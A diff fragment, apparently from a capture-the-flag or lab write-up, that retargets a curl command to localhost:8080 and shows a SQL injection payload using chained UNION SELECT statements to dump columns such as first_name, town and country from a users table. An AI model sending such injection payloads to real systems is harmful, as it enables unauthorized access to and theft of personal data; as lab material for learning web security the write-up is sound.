@@ -70,7 +70,7 @@ From the result we learn that users has at least these columns:
 
 Craft a multi-UNION query to dump each column:
 
-curl "http://<TARGET>/?page=member&\
+curl "http://localhost:8080/?page=member&\
 id=0%3D0+\
 UNION+SELECT+first_name%2C+town+FROM+users+\
 UNION+SELECT+first_name%2C+country+FROM+users+\
